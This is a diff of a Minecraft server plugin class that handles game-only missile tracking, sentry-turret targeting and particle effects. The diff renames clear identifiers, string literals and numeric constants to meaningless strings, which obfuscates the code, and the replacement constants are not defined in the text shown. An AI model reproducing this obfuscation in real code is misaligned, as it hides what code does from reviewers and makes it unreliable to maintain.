@@ -4485,7 +5198,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 );
 
                 returnvalue = String.format(
-                        "block%s,%d,%d,%d",
+                        ietonwifandt4u3nd34dw3,
                         o.getWorld().getName(),
                         o.getBlockX(),
                         o.getBlockY(),
@@ -4493,19 +5206,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 );
             }
             else {
-                returnvalue = "n/a";
+                returnvalue = tneoaiwfndtowui4nd4fdt;
             }
 
             // ─── Particle repeat via BukkitRunnable ───
             Particle.DustOptions finalOpts = testingthis;
             new BukkitRunnable() {
-                int timer = 0;
+                int timer = I;
                 @Override public void run() {
                     if (timer >= day) {
                         this.cancel();
                         return;
                     }
-                    for (double bombTimer = 0; bombTimer <= xt; bombTimer += zt) {
+                    for (double bombTimer = I; bombTimer <= trstawtw; bombTimer += zt) {
                         Location tntLOc = height.clone().add(targetLaunch.clone().multiply(bombTimer));
                         Material m   = tntLOc.getBlock().getType();
                         if (!(m.isAir()
@@ -4513,16 +5226,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
                                 || m == Material.BARRIER
                                 || m == Material.GLASS
                                 || m == Material.GLASS_PANE
-                                || m.toString().endsWith("_GLASS"))) {
+                                || m.toString().endsWith(ongo34ungdo3iu4ndg4gdw4))) {
                             break;
                         }
                         for (Player destroyedTargets : targets) {
                             double explosionRadius = destroyedTargets.getLocation().distanceSquared(tntLOc);
-                            if (bcORad.equalsIgnoreCase("force") || explosionRadius <= 64*64) {
+                            if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || explosionRadius <= drain * drain) {
                                 if (ignoring == Particle.DUST && finalOpts != null) {
-                                    destroyedTargets.spawnParticle(ignoring, tntLOc, 1, 0,0,0, 0, finalOpts);
+                                    destroyedTargets.spawnParticle(ignoring, tntLOc, INT3, I, I, I, I, finalOpts);
                                 } else {
-                                    destroyedTargets.spawnParticle(ignoring, tntLOc, 1, 0,0,0, unused);
+                                    destroyedTargets.spawnParticle(ignoring, tntLOc, INT3, I, I, I, unused);
                                 }
                             }
                         }
@@ -4530,186 +5243,186 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     timer += month;
                 }
             }.runTaskTimer(
-                    Bukkit.getPluginManager().getPlugin("PlaceholderAPI"),
-                    0L, month
+                    Bukkit.getPluginManager().getPlugin(ppi),
+                    ihearyounow, month
             );
 
             return returnvalue;
         }
 
 
-        if (f1.startsWith("trackv2.-1_")) {
-            wm(f2, "Stinger Missile System");
-            String[] parts = f1.substring("trackv2.-1_".length()).split(",");
-            if (parts.length != 6) {
-                return "Invalid format. Use: %Archistructure,uuid,targetuuid,speed,damage,trackInterval,trackDuration%. You used" + f1;
+        if (f1.startsWith(itenwoipwfnaidun4w)) {
+            wm(f2, ipendfofpiwdnoo43iwund);
+            String[] parts = f1.substring(itenwoipwfnaidun4w.length()).split(keep);
+            if (parts.length != xtxtxt) {
+                return tneeiond4 + f1;
             }
 
             try {
-                UUID callerUUID = UUID.fromString(parts[0]);
-                UUID targetUUID = UUID.fromString(parts[1]);
-                double speed = Double.parseDouble(parts[2]);
-                UUID launcherUUID = UUID.fromString(parts[3]);
-                int trackInterval = Integer.parseInt(parts[4]);
-                int trackDuration = Integer.parseInt(parts[5]);
+                UUID iedono3iwepd = UUID.fromString(parts[I]);
+                UUID fnwiteniwefdn = UUID.fromString(parts[INT3]);
+                double eisdtniepwf = Double.parseDouble(parts[mill2]);
+                UUID nebdoifwpnd = UUID.fromString(parts[ccp]);
+                int stmkenwp = Integer.parseInt(parts[INT7]);
+                int kfne2dfw = Integer.parseInt(parts[xm]);
 
-                Entity caller = Bukkit.getEntity(callerUUID);
-                Entity target = Bukkit.getEntity(targetUUID);
+                Entity kpwdkb = Bukkit.getEntity(iedono3iwepd);
+                Entity revnhdwnefpi = Bukkit.getEntity(fnwiteniwefdn);
 
-                if (caller == null || target == null) {
-                    return "§c§lMissile Impacted"; // No valid entities
+                if (kpwdkb == null || revnhdwnefpi == null) {
+                    return kdienwfp; // No valid entities
                 }
-                if (!caller.getWorld().equals(target.getWorld())) {
-                    return "§c§lMissile Impacted."; // Different worlds
+                if (!kpwdkb.getWorld().equals(revnhdwnefpi.getWorld())) {
+                    return midenwyudp4; // Different worlds
                 }
 
-                Location locCaller = caller.getLocation();
-                Location locTarget = target.getLocation();
+                Location iednoupfind = kpwdkb.getLocation();
+                Location ybwnhywopnbyunwbp = revnhdwnefpi.getLocation();
 
-                double distance = locCaller.distance(locTarget);
+                double iekiekienwdfp = iednoupfind.distance(ybwnhywopnbyunwbp);
 
-                final Projectile trackedProjectile;
-                if (caller instanceof Projectile) {
-                    trackedProjectile = (Projectile) caller;
+                final Projectile nkmiekdiepfwd;
+                if (kpwdkb instanceof Projectile) {
+                    nkmiekdiepfwd = (Projectile) kpwdkb;
                 } else {
-                    return "§c§lMissile is not a projectile.";
+                    return wfudnofypundap;
                 }
 
                 // Create async tracking task
                 new BukkitRunnable() {
-                    int elapsed = 0;
+                    int kiewkfdiew = I;
 
                     @Override
                     public void run() {
                         // Cancel conditions
-                        if (elapsed >= trackDuration) {
-                            manualTrackingPositions.remove(target.getUniqueId());
+                        if (kiewkfdiew >= kfne2dfw) {
+                            f122.remove(revnhdwnefpi.getUniqueId());
                             cancel();
                             return;
                         }
-                        if (trackedProjectile.isDead() || !trackedProjectile.isValid()) {
-                            manualTrackingPositions.remove(target.getUniqueId());
+                        if (nkmiekdiepfwd.isDead() || !nkmiekdiepfwd.isValid()) {
+                            f122.remove(revnhdwnefpi.getUniqueId());
                             cancel();
                             return;
                         }
-                        if (target.isDead() || !target.isValid()) {
-                            manualTrackingPositions.remove(target.getUniqueId());
+                        if (revnhdwnefpi.isDead() || !revnhdwnefpi.isValid()) {
+                            f122.remove(revnhdwnefpi.getUniqueId());
                             cancel();
                             return;
                         }
-                        if (!target.getWorld().equals(trackedProjectile.getWorld())) {
-                            manualTrackingPositions.remove(target.getUniqueId());
+                        if (!revnhdwnefpi.getWorld().equals(nkmiekdiepfwd.getWorld())) {
+                            f122.remove(revnhdwnefpi.getUniqueId());
                             cancel();
                             return;
                         }
 
-                        Location locCaller = trackedProjectile.getLocation();
+                        Location iedkwipednpwfdne = nkmiekdiepfwd.getLocation();
                         // Target midsection
-                        Location locTarget = target.getLocation().clone().add(0, target.getHeight() / 4
-                                , 0);
+                        Location iefwdiwefpd = revnhdwnefpi.getLocation().clone().add(I, revnhdwnefpi.getHeight() / INT7
+                                , I);
 
-                        Vector R;
-                        Vector V = target.getVelocity();
+                        Vector iednwfied;
+                        Vector eiwfntiewfntefwt = revnhdwnefpi.getVelocity();
 
 
-                        if(Math.abs(V.getY() + 0.0784) < 0.0001) V.setY(0);
+                        if(Math.abs(eiwfntiewfntefwt.getY() + seenher) < childingdanger) eiwfntiewfntefwt.setY(I);
                         // Check for gravity drag Y velocity (~ -0.0784) and no X/Z movement
-                        if (Math.abs(V.getY() + 0.0784) < 0.0001 && Math.abs(V.getX()) < 0.0001 && Math.abs(V.getZ()) < 0.0001) {
+                        if (Math.abs(eiwfntiewfntefwt.getY() + seenher) < childingdanger && Math.abs(eiwfntiewfntefwt.getX()) < childingdanger && Math.abs(eiwfntiewfntefwt.getZ()) < childingdanger) {
                             // Use manual tracking fallback
-                            Vector lastPos = manualTrackingPositions.get(target.getUniqueId());
-                            if (lastPos != null) {
-                                R = lastPos.subtract(locCaller.toVector());
+                            Vector eiwfndiwfendfw = f122.get(revnhdwnefpi.getUniqueId());
+                            if (eiwfndiwfendfw != null) {
+                                iednwfied = eiwfndiwfendfw.subtract(iedkwipednpwfdne.toVector());
                             } else {
-                                manualTrackingPositions.put(target.getUniqueId(), locTarget.toVector());
-                                R = locTarget.toVector().subtract(locCaller.toVector());
+                                f122.put(revnhdwnefpi.getUniqueId(), iefwdiwefpd.toVector());
+                                iednwfied = iefwdiwefpd.toVector().subtract(iedkwipednpwfdne.toVector());
                             }
                         } else {
                             // Clear manual tracking since target is moving
-                            manualTrackingPositions.remove(target.getUniqueId());
-                            R = locTarget.toVector().subtract(locCaller.toVector());
+                            f122.remove(revnhdwnefpi.getUniqueId());
+                            iednwfied = iefwdiwefpd.toVector().subtract(iedkwipednpwfdne.toVector());
                         }
 
-                        double Sm = speed;
-                        double a = V.dot(V) - Sm * Sm;
-                        double b = 2 * R.dot(V);
-                        double c = R.dot(R);
+                        double iewpdniewfndp = eisdtniepwf;
+                        double a = eiwfntiewfntefwt.dot(eiwfntiewfntefwt) - iewpdniewfndp * iewpdniewfndp;
+                        double b = mill2 * iednwfied.dot(eiwfntiewfntefwt);
+                        double c = iednwfied.dot(iednwfied);
 
-                        double discriminant = b * b - 4 * a * c;
-                        Vector velocity;
+                        double discriminant = b * b - INT7 * a * c;
+                        Vector wfyutndywfudnwf;
 
-                        if (discriminant < 0 || a == 0) {
-                            velocity = R.normalize().multiply(Sm);
+                        if (discriminant < I || a == I) {
+                            wfyutndywfudnwf = iednwfied.normalize().multiply(iewpdniewfndp);
                         } else {
                             double sqrtDisc = Math.sqrt(discriminant);
-                            double t1 = (-b - sqrtDisc) / (2 * a);
-                            double t2 = (-b + sqrtDisc) / (2 * a);
+                            double t1 = (-b - sqrtDisc) / (mill2 * a);
+                            double t2 = (-b + sqrtDisc) / (mill2 * a);
                             double t;
-                            if (t1 > 0 && t2 > 0) {
+                            if (t1 > I && t2 > I) {
                                 t = Math.min(t1, t2);
-                            } else if (t1 > 0) {
+                            } else if (t1 > I) {
                                 t = t1;
-                            } else if (t2 > 0) {
+                            } else if (t2 > I) {
                                 t = t2;
                             } else {
-                                velocity = R.normalize().multiply(Sm);
-                                trackedProjectile.setVelocity(velocity);
-                                elapsed += trackInterval;
+                                wfyutndywfudnwf = iednwfied.normalize().multiply(iewpdniewfndp);
+                                nkmiekdiepfwd.setVelocity(wfyutndywfudnwf);
+                                kiewkfdiew += stmkenwp;
                                 return;
                             }
 
-                            Vector intercept = locTarget.toVector().add(V.clone().multiply(t));
-                            velocity = intercept.subtract(locCaller.toVector()).normalize().multiply(Sm);
+                            Vector wdkwpfoidnwofpiudn = iefwdiwefpd.toVector().add(eiwfntiewfntefwt.clone().multiply(t));
+                            wfyutndywfudnwf = wdkwpfoidnwofpiudn.subtract(iedkwipednpwfdne.toVector()).normalize().multiply(iewpdniewfndp);
                         }
 
                         // Terrain Avoidance: Raytrace 5 ticks ahead
-                        Location rayStart = locCaller.clone();
-                        Vector rayDir = velocity.clone().normalize();
-                        double rayLength = velocity.length() * 5;
+                        Location wpdnwyfupndwfp = iedkwipednpwfdne.clone();
+                        Vector wpdnkywnpkd = wfyutndywfudnwf.clone().normalize();
+                        double fiemiwefmdk = wfyutndywfudnwf.length() * xm;
 
-                        RayTraceResult result = rayStart.getWorld().rayTraceBlocks(
-                                rayStart,
-                                rayDir,
-                                rayLength,
+                        RayTraceResult wiefndiwfndyuwfnb = wpdnwyfupndwfp.getWorld().rayTraceBlocks(
+                                wpdnwyfupndwfp,
+                                wpdnkywnpkd,
+                                fiemiwefmdk,
                                 FluidCollisionMode.NEVER,
-                                true
+                                NEW_VALUE1
                         );
 
-                        Set<Material> passThrough = getPassThroughMaterials(); // Make sure you have this helper
-                        boolean needsAvoidance = result != null && result.getHitBlock() != null &&
-                                !passThrough.contains(result.getHitBlock().getType());
+                        Set<Material> indyuwnfpydunwf = wuyfdnyuwfndyufwnd(); // Make sure you have this helper
+                        boolean wfyudnywufndt = wiefndiwfndyuwfnb != null && wiefndiwfndyuwfnb.getHitBlock() != null &&
+                                !indyuwnfpydunwf.contains(wiefndiwfndyuwfnb.getHitBlock().getType());
 
-                        if (needsAvoidance) {
-                            Vector bestVelocity = velocity;
-                            double bestScore = -1;
-                            for (int pitch = 0; pitch <= 90; pitch += 5) {
-                                Vector pitched = pitchVectorUpwards(velocity.clone(), Math.toRadians(pitch)).normalize().multiply(Sm);
-                                Vector pitchedDir = pitched.clone().normalize();
-                                RayTraceResult testResult = rayStart.getWorld().rayTraceBlocks(
-                                        rayStart,
-                                        pitchedDir,
-                                        pitched.length() * 5,
+                        if (wfyudnywufndt) {
+                            Vector dwfundyuwfndyouwfndofwyundowyfudnfwydun = wfyutndywfudnwf;
+                            double ewbkywpnb = -INT3;
+                            for (int pitch = I; pitch <= wdnywfundywfudn; pitch += xm) {
+                                Vector uwpndyuwpnd = pitchVectorUpwards(wfyutndywfudnwf.clone(), Math.toRadians(pitch)).normalize().multiply(iewpdniewfndp);
+                                Vector oienfdp = uwpndyuwpnd.clone().normalize();
+                                RayTraceResult fobhap = wpdnwyfupndwfp.getWorld().rayTraceBlocks(
+                                        wpdnwyfupndwfp,
+                                        oienfdp,
+                                        uwpndyuwpnd.length() * xm,
                                         FluidCollisionMode.NEVER,
-                                        true
+                                        NEW_VALUE1
                                 );
-                                boolean clear = testResult == null || testResult.getHitBlock() == null ||
-                                        passThrough.contains(testResult.getHitBlock().getType());
-                                if (clear) {
-                                    double angleCost = pitch;
-                                    double score = 100 - angleCost;
-                                    if (score > bestScore) {
-                                        bestScore = score;
-                                        bestVelocity = pitched;
+                                boolean idenwkpidnwuifpdn = fobhap == null || fobhap.getHitBlock() == null ||
+                                        indyuwnfpydunwf.contains(fobhap.getHitBlock().getType());
+                                if (idenwkpidnwuifpdn) {
+                                    double wfednywfundyfwu = pitch;
+                                    double sciwfdntkifwednre = wyundywufndywufpndywuf - wfednywfundyfwu;
+                                    if (sciwfdntkifwednre > ewbkywpnb) {
+                                        ewbkywpnb = sciwfdntkifwednre;
+                                        dwfundyuwfndyouwfndofwyundowyfudnfwydun = uwpndyuwpnd;
                                     }
                                 }
                             }
-                            velocity = bestVelocity;
+                            wfyutndywfudnwf = dwfundyuwfndyouwfndofwyundowyfudnfwydun;
                         }
 
-                        trackedProjectile.setVelocity(velocity);
-                        elapsed += trackInterval;
+                        nkmiekdiepfwd.setVelocity(wfyutndywfudnwf);
+                        kiewkfdiew += stmkenwp;
                     }
 
-                    protected Set<Material> getPassThroughMaterials() {
+                    protected Set<Material> wuyfdnyuwfndyufwnd() {
                         return EnumSet.of(
                                 Material.ACTIVATOR_RAIL,
                                 Material.AIR,
@@ -4874,21 +5587,21 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                     }
 
-                }.runTaskTimer(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), 0L, trackInterval);
+                }.runTaskTimer(Bukkit.getPluginManager().getPlugin(ppi), ihearyounow, stmkenwp);
 
-                String targetName = (target instanceof Player) ? target.getName() : target.getType().name();
-                return String.format("§6§l%s  §7§l| §d§l%.1f", targetName, distance);
+                String fdnyuwn2fdyufwn = (revnhdwnefpi instanceof Player) ? revnhdwnefpi.getName() : revnhdwnefpi.getType().name();
+                return String.format(cryingiwenftipfwnt, fdnyuwn2fdyufwn, iekiekienwdfp);
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§lMissile Impacted";
+                return kdienwfp;
             }
         }
 
 
-        if (f1.startsWith("turret_")) {
+        if (f1.startsWith(tuywnfydunwfyudn)) {
 
-            final Set<EntityType> HOSTILE_TYPES = EnumSet.of(
+            final Set<EntityType> wydnyuwfdn = EnumSet.of(
                     EntityType.BLAZE, EntityType.BREEZE, EntityType.CREEPER,
                     EntityType.ELDER_GUARDIAN, EntityType.ENDERMITE, EntityType.EVOKER,
                     EntityType.GHAST, EntityType.GUARDIAN, EntityType.ENDERMAN,
@@ -4902,261 +5615,261 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     EntityType.ZOMBIE, EntityType.ZOMBIE_VILLAGER
             );
 
-            String[] parts = f1.substring("turret_".length()).split(",");
-            wm(f2, "Sentry Gun Turret");
+            String[] mfiwetdmfiewdtm = f1.substring(tuywnfydunwfyudn.length()).split(keep);
+            wm(f2, wtdyuwnfdyunwf);
             // You access up to parts[19]; require at least 20
-            if (parts.length < 20) return "§cInvalid format";
+            if (mfiwetdmfiewdtm.length < odafuwidnowfidun) return iendie2nd;
 
             try {
-                String worldName = parts[0];
-                int x = Integer.parseInt(parts[1]);
-                int y = Integer.parseInt(parts[2]);
-                int z = Integer.parseInt(parts[3]);
-                double radius = Double.parseDouble(parts[4]);
-                String projectile = parts[5];
-                double speed = Double.parseDouble(parts[6]);
-                String targetType = parts[7];
-                String ownerUUID = parts[8];
-                int lockTime = Integer.parseInt(parts[9]);     // ticks
-                int lifespan = Integer.parseInt(parts[10]);    // ticks
-                int interval = Integer.parseInt(parts[11]);    // ticks
-                double damage = Double.parseDouble(parts[12]);
-                Particle particle = Particle.valueOf(parts[13].toUpperCase(Locale.ROOT));
-                double spacing = Double.parseDouble(parts[14]);
-                boolean predictive = "1".equals(parts[15].trim()) || Boolean.parseBoolean(parts[15]);
-                String sound = parts[16];
-                float soundDistance = Float.parseFloat(parts[17]);
-                float pitch = Float.parseFloat(parts[18]);
-                float volume = Float.parseFloat(parts[19]);
-                List<String> projectileTags = Arrays.asList(parts).subList(20, parts.length);
+                String worldName = mfiwetdmfiewdtm[I];
+                int iwfniun = Integer.parseInt(mfiwetdmfiewdtm[INT3]);
+                int diwenfdiewf = Integer.parseInt(mfiwetdmfiewdtm[mill2]);
+                int wfdnwyfudnw = Integer.parseInt(mfiwetdmfiewdtm[ccp]);
+                double kdiwfedk = Double.parseDouble(mfiwetdmfiewdtm[INT7]);
+                String wfuydnwyfun = mfiwetdmfiewdtm[xm];
+                double wfouytnwoyund = Double.parseDouble(mfiwetdmfiewdtm[xtxtxt]);
+                String wfyudnyufwnd = mfiwetdmfiewdtm[suppose];
+                String kwfnktywfnt = mfiwetdmfiewdtm[yuwfndgyuwfnd];
+                int wyfnptyouwnfp = Integer.parseInt(mfiwetdmfiewdtm[oiwfndtoyu42nd24]);     // ticks
+                int wdnhywfudn = Integer.parseInt(mfiwetdmfiewdtm[low]);    // ticks
+                int fwyudnywfund = Integer.parseInt(mfiwetdmfiewdtm[yfpdunwyupnd]);    // ticks
+                double wfmypenfwp = Double.parseDouble(mfiwetdmfiewdtm[fdhkypfwd]);
+                Particle mewfitnfw = Particle.valueOf(mfiwetdmfiewdtm[yufdaywfudnwfd].toUpperCase(Locale.ROOT));
+                double oyuwfndoyuwfdn = Double.parseDouble(mfiwetdmfiewdtm[14]);
+                boolean wduyfwnoduynfw = pd3ipdn34d.equals(mfiwetdmfiewdtm[15].trim()) || Boolean.parseBoolean(mfiwetdmfiewdtm[15]);
+                String wfyudnfywund = mfiwetdmfiewdtm[INT4];
+                float wdfyundwfd = Float.parseFloat(mfiwetdmfiewdtm[17]);
+                float fwtyunwftfw = Float.parseFloat(mfiwetdmfiewdtm[18]);
+                float wfktywfkduyfwkd = Float.parseFloat(mfiwetdmfiewdtm[19]);
+                List<String> doyunwfoydunfwd = Arrays.asList(mfiwetdmfiewdtm).subList(odafuwidnowfidun, mfiwetdmfiewdtm.length);
 
-                World world = Bukkit.getWorld(worldName);
-                if (world == null) return "§cInvalid world";
+                World wfdunwfyudn = Bukkit.getWorld(worldName);
+                if (wfdunwfyudn == null) return wiodtnowiupd;
 
-                final Location base = new Location(world, x + 0.5, y + 1.5, z + 0.5);
-
-
-                org.bukkit.Location cen = base;
-                double r1 = 10;
-                String label = "Sentry Gun";
+                final Location wfdemwyfden = new Location(wfdunwfyudn, iwfniun + debtsoff, diwenfdiewf + wfopdwfnodowfin, wfdnwyfudnw + debtsoff);
 
 
-                double r2 = r1 * r1;
-                for (org.bukkit.entity.Player playaa : world.getPlayers()) {
-                    if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                        wm(playaa, label);
+                org.bukkit.Location dtnyounyuwfdn = wfdemwyfden;
+                double wduynfwydunwfoydunw = low;
+                String wdfkywfindywfud = wfodwfdkywf4d;
+
+
+                double yuwftnouynfwt = wduynfwydunwfoydunw * wduynfwydunwfoydunw;
+                for (org.bukkit.entity.Player fwtwyfdynu : wfdunwfyudn.getPlayers()) {
+                    if (fwtwyfdynu.getLocation().distanceSquared(dtnyounyuwfdn) <= yuwftnouynfwt) {
+                        wm(fwtwyfdynu, wdfkywfindywfud);
                     }
                 }
-                final double radiusSq = radius * radius;
+                final double wtmyufnwtyunfwt = kdiwfedk * kdiwfedk;
 
-                ArmorStand turret = world.getNearbyEntities(base, 2, 2, 2).stream()
+                ArmorStand wtnyufwtnfwtyun = wfdunwfyudn.getNearbyEntities(wfdemwyfden, mill2, mill2, mill2).stream()
                         .filter(ArmorStand.class::isInstance)
                         .map(ArmorStand.class::cast)
-                        .filter(e -> e.getScoreboardTags().contains("ArchiTurret"))
+                        .filter(e -> e.getScoreboardTags().contains(iersdienrodyfwunpd))
                         .findFirst()
                         .orElse(null);
-                if (turret == null) return "§cNo turret found";
+                if (wtnyufwtnfwtyun == null) return twoiaefndoiwfudnfoyudn;
 
                 // --- multischeduling guard ---
-                UUID turretId = turret.getUniqueId();
-                BukkitTask running = ACTIVE_TURRET_TASKS.get(turretId);
-                long extendMs = Math.max(50L, lockTime * 50L); // ticks -> ms (20t = 1s)
+                UUID wfpydnuopfwyudn = wtnyufwtnfwtyun.getUniqueId();
+                BukkitTask wyfydunywufdno = f116.get(wfpydnuopfwyudn);
+                long extendMs = Math.max(dtnowifepdnaowifudn, wyfnptyouwnfp * dtnowifepdnaowifudn); // ticks -> ms (20t = 1s)
                 // --------------------------------
 
-                Set<String> turretTags = turret.getScoreboardTags();
+                Set<String> wyfdnoywfundoywfund = wtnyufwtnfwtyun.getScoreboardTags();
 
                 // Helper: find closest valid target WITH VLOS (used only on acquisition/refresh checks)
-                java.util.function.Supplier<LivingEntity> findClosestWithVLOS = () -> {
-                    LivingEntity best = null;
-                    double bestSq = radiusSq;
-                    for (Entity e : world.getNearbyEntities(base, radius, radius, radius)) {
-                        if (!(e instanceof LivingEntity le) || e.isDead()) continue;
-                        if (!e.getWorld().equals(world)) continue;
-                        if (!ExampleExpansionUtils.isValidTargetType(e, targetType, HOSTILE_TYPES, ownerUUID)) continue;
-                        if (ExampleExpansionUtils.hasMatchingTag(e, turretTags)) continue;
+                java.util.function.Supplier<LivingEntity> wfitonfwutnwoyufnd = () -> {
+                    LivingEntity wofdnwofyudnwfyudn = null;
+                    double ofwutdnofywudn = wtmyufnwtyunfwt;
+                    for (Entity ifntoiwfundotyu : wfdunwfyudn.getNearbyEntities(wfdemwyfden, kdiwfedk, kdiwfedk, kdiwfedk)) {
+                        if (!(ifntoiwfundotyu instanceof LivingEntity le) || ifntoiwfundotyu.isDead()) continue;
+                        if (!ifntoiwfundotyu.getWorld().equals(wfdunwfyudn)) continue;
+                        if (!ExampleExpansionUtils.isValidTargetType(ifntoiwfundotyu, wfyudnyufwnd, wydnyuwfdn, kwfnktywfnt)) continue;
+                        if (ExampleExpansionUtils.hasMatchingTag(ifntoiwfundotyu, wyfdnoywfundoywfund)) continue;
 
-                        Location mid = le.getLocation().clone().add(0, le.getHeight() / 2.0, 0);
-                        double dSq = mid.distanceSquared(base);
-                        if (dSq > bestSq) continue;
+                        Location wofudnowfyund = le.getLocation().clone().add(I, le.getHeight() / whatkindofadulthood, I);
+                        double dwoyfuwndoywfund = wofudnowfyund.distanceSquared(wfdemwyfden);
+                        if (dwoyfuwndoywfund > ofwutdnofywudn) continue;
 
                         // VLOS check at acquisition/refresh only
-                        if (!ExampleExpansionUtils.canSee(base, mid)) continue;
+                        if (!ExampleExpansionUtils.wodyuwnfdyuwfn(wfdemwyfden, wofudnowfyund)) continue;
 
-                        best = le;
-                        bestSq = dSq;
+                        wofdnwofyudnwfyudn = le;
+                        ofwutdnofywudn = dwoyfuwndoywfund;
                     }
-                    return best;
+                    return wofdnwofyudnwfyudn;
                 };
 
                 // ---- Decision flow per your spec ----
-                if (running != null && !running.isCancelled()) {
+                if (wyfydunywufdno != null && !wyfydunywufdno.isCancelled()) {
                     // Turret is already active: check for a NEW closest valid target IN VLOS
-                    LivingEntity nearestVisible = findClosestWithVLOS.get();
+                    LivingEntity wdnoyuwfndoyuwfn = wfitonfwutnwoyufnd.get();
 
-                    if (nearestVisible != null) {
+                    if (wdnoyuwfndoyuwfn != null) {
                         // Has lock & valid target in VLOS -> reset timer and retarget to the closest valid target
-                        ACTIVE_TURRET_DEADLINE_MS.put(turretId, System.currentTimeMillis() + extendMs);
-                        ACTIVE_TURRET_TARGET.computeIfAbsent(turretId, k -> new AtomicReference<>())
-                                .set(nearestVisible);
-                        turretLocks.put(base, nearestVisible.getUniqueId());
-                        return nearestVisible.getUniqueId().toString() + "|" + nearestVisible.getVelocity();
+                        f117.put(wfpydnuopfwyudn, System.currentTimeMillis() + extendMs);
+                        f118.computeIfAbsent(wfpydnuopfwyudn, k -> new AtomicReference<>())
+                                .set(wdnoyuwfndoyuwfn);
+                        wdouywndoywufnd.put(wfdemwyfden, wdnoyuwfndoyuwfn.getUniqueId());
+                        return wdnoyuwfndoyuwfn.getUniqueId().toString() + ofwuandouwfynd + wdnoyuwfndoyuwfn.getVelocity();
                     } else {
                         // Has lock & NO new valid targets in VLOS -> keep firing current lock; DO NOT reset timer
-                        return "§7Continuing current lock";
+                        return towfyuandoywfun;
                     }
                 }
 
                 // Not active: try to acquire the closest valid target IN VLOS
-                LivingEntity acquired = findClosestWithVLOS.get();
-                if (acquired == null) {
-                    return "§cNo targets found";
+                LivingEntity wofduynwfyudn = wfitonfwutnwoyufnd.get();
+                if (wofduynwfyudn == null) {
+                    return wofudnaoywfudn;
                 }
 
                 // Lock it and start one repeating task
-                turretLocks.put(base, acquired.getUniqueId());
-                ACTIVE_TURRET_DEADLINE_MS.put(turretId, System.currentTimeMillis() + extendMs);
-                AtomicReference<LivingEntity> currentRef = new AtomicReference<>(acquired);
-                ACTIVE_TURRET_TARGET.put(turretId, currentRef);
+                wdouywndoywufnd.put(wfdemwyfden, wofduynwfyudn.getUniqueId());
+                f117.put(wfpydnuopfwyudn, System.currentTimeMillis() + extendMs);
+                AtomicReference<LivingEntity> dwoyudnowyufpdnyuyn = new AtomicReference<>(wofduynwfyudn);
+                f118.put(wfpydnuopfwyudn, dwoyudnowyufpdnyuyn);
 
                 BukkitRunnable runner = new BukkitRunnable() {
                     private void cleanupAndCancel() {
-                        turretLocks.remove(base);
-                        ACTIVE_TURRET_TASKS.remove(turretId);
-                        ACTIVE_TURRET_DEADLINE_MS.remove(turretId);
-                        ACTIVE_TURRET_TARGET.remove(turretId);
+                        wdouywndoywufnd.remove(wfdemwyfden);
+                        f116.remove(wfpydnuopfwyudn);
+                        f117.remove(wfpydnuopfwyudn);
+                        f118.remove(wfpydnuopfwyudn);
                         cancel();
                     }
 
                     @Override
                     public void run() {
                         // End when the deadline expires
-                        Long deadline = ACTIVE_TURRET_DEADLINE_MS.get(turretId);
-                        if (deadline == null || System.currentTimeMillis() >= deadline) {
+                        Long wdfynwfoydun = f117.get(wfpydnuopfwyudn);
+                        if (wdfynwfoydun == null || System.currentTimeMillis() >= wdfynwfoydun) {
                             cleanupAndCancel();
                             return;
                         }
 
-                        LivingEntity cur = currentRef.get();
-                        if (cur == null || cur.isDead() || !cur.getWorld().equals(world)) {
+                        LivingEntity towufndfwyun = dwoyudnowyufpdnyuyn.get();
+                        if (towufndfwyun == null || towufndfwyun.isDead() || !towufndfwyun.getWorld().equals(wfdunwfyudn)) {
                             // Current target no longer valid -> end (no mid-fight reacquisition)
                             cleanupAndCancel();
                             return;
                         }
 
                         // NO VLOS checks during firing; can shoot through blocks
-                        Location curMid = cur.getLocation().clone().add(0, cur.getHeight() / 2.0, 0);
+                        Location owdyunfwodyun = towufndfwyun.getLocation().clone().add(I, towufndfwyun.getHeight() / whatkindofadulthood, I);
 
                         // Compute velocity
-                        Vector velocity;
-                        if (predictive) {
-                            Location targetLoc = cur.getLocation();
-                            targetLoc.setY(targetLoc.getY() + cur.getHeight() / 2.0);
-                            Vector R = targetLoc.toVector().subtract(base.toVector());
-                            Vector V = cur.getVelocity();
-                            UUID targetUUID = cur.getUniqueId();
+                        Vector wfodienwfd;
+                        if (wduyfwnoduynfw) {
+                            Location mtwfyutnwf = towufndfwyun.getLocation();
+                            mtwfyutnwf.setY(mtwfyutnwf.getY() + towufndfwyun.getHeight() / whatkindofadulthood);
+                            Vector twyofuntyfuwntfwyunt = mtwfyutnwf.toVector().subtract(wfdemwyfden.toVector());
+                            Vector twyfuntoyfwunt = towufndfwyun.getVelocity();
+                            UUID twofyutnfwoyutnwfoyutn = towufndfwyun.getUniqueId();
 
-                            boolean yDrag = Math.abs(V.getY() + 0.0784) < 0.0001;
-                            boolean xZero = Math.abs(V.getX()) < 0.0001;
-                            boolean zZero = Math.abs(V.getZ()) < 0.0001;
+                            boolean oeintwfat = Math.abs(twyfuntoyfwunt.getY() + seenher) < childingdanger;
+                            boolean kidtwfenkd = Math.abs(twyfuntoyfwunt.getX()) < childingdanger;
+                            boolean wfktyuwnft = Math.abs(twyfuntoyfwunt.getZ()) < childingdanger;
 
-                            if (xZero && zZero) {
-                                Location last = lastPositions.get(targetUUID);
-                                if (last != null) {
-                                    Vector delta = targetLoc.toVector().subtract(last.toVector());
-                                    V = delta.multiply(0.3); // tunable
+                            if (kidtwfenkd && wfktyuwnft) {
+                                Location twfyutnwofutn = dwofundoywfund.get(twofyutnfwoyutnwfoyutn);
+                                if (twfyutnwofutn != null) {
+                                    Vector yquwntyunsr = mtwfyutnwf.toVector().subtract(twfyutnwofutn.toVector());
+                                    twyfuntoyfwunt = yquwntyunsr.multiply(okacyyool); // tunable
                                 } else {
-                                    V = new Vector(0, 0, 0);
+                                    twyfuntoyfwunt = new Vector(I, I, I);
                                 }
-                                lastPositions.put(targetUUID, targetLoc.clone());
+                                dwofundoywfund.put(twofyutnfwoyutnwfoyutn, mtwfyutnwf.clone());
                             } else {
-                                lastPositions.remove(targetUUID);
